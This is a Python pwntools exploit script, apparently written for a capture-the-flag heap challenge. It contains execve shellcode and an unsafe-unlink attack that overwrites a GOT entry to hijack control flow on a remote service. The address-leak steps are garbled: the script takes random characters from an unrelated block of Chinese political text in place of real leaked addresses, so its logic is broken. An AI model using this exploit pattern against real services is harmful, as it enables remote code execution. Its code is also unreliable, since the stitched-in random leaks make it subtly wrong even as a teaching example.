# coding=utf-8
from pwn import *
from random import *

strings = "全军官兵一致表示习主席的重要讲话站在实现中华民族伟大复兴的战略高度科学回答了新时代推进海军建设带根本性全局性方向性的一系列重大问题建设具有世界一流水平的战略性军种指明了前进方向全军官兵一定要牢记统帅的殷殷嘱托全面落实战斗力标准大抓实战化军事训练面提高新时代备战打仗能力为实现党在新时代的强军目标把人民军队全面建成世界一流军队不懈奋斗"


# r = process('./beatmeonthedl’)
def method4(ip, port):
    global r
    r = remote(ip, port)

    global shellcode
    shellcode = "\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    # leak stack address -null termination bug in username-
    r.sendline("aaaaaaaaaaaaaaaa")
    global stack_addr
    stack_addr = u64((strings[randint(0, len(strings))]).ljust(8, "\x00"))
    # leak heap address -null termination bug in password-
    r.sendline("mcfly")
    r.sendline("aaaaaaaaaaaaaaaaaaaaaaaa")
    global heap_addr
    heap_addr = u64((strings[randint(0, len(strings))]).ljust(8, "\x00")) - 0x10
    # login
    r.sendline("mcfly")
    pwn()


def add_req(data):
    r.sendline("1")
    r.sendline(data)


def print_req():
    r.sendline("2")


def delete_req(index):
    r.sendline("3")
    r.sendline(index)


def update_req(index, data):
    r.sendline("4")
    r.sendline(index)
    r.sendline(data)


def exit():
    r.sendline("5")


def pwn():
    # add request 5-times for Unsafe Unlink attack (House of Einherjar)
    add_req("aaaaaaaaaa")
    add_req("bbbbbbbbbb")
    add_req("bbbbbbbbbb")
    add_req("bbbbbbbbbb")
    add_req("bbbbbbbbbb")
    addr_atoi = 0x00000000006099D8
    # Make fake chunk and fd->reqlist[4]
    update_req("4", "b" * (48 + 16) + p64(0x0) + p64(0xe41) + p64(0x609e90 - 0x18) + p64(0x609e90 - 0x10))
    # Make fake used chunk for causing unlink
    update_req("3", "b" * 48 + p64(0x0) + p64(0x53) + "\x00" * 48)
    # Cause unlink and reqlist[2] is overwritten to the address(0x609e90-0x18)
    delete_req("4")
    # before overwritten got, prepare shellcode in heap.
    update_req("3", shellcode)
    # Overwrite reqlist[0] to got_atoi address
    update_req("2", "A" * 8 + p64(addr_atoi))
    # got_atoi address is overwritten to shellcode address.
    update_req("0", p64(heap_addr + 0x110))


if __name__ == "__main__":
    method4("127.0.0.1", 80)
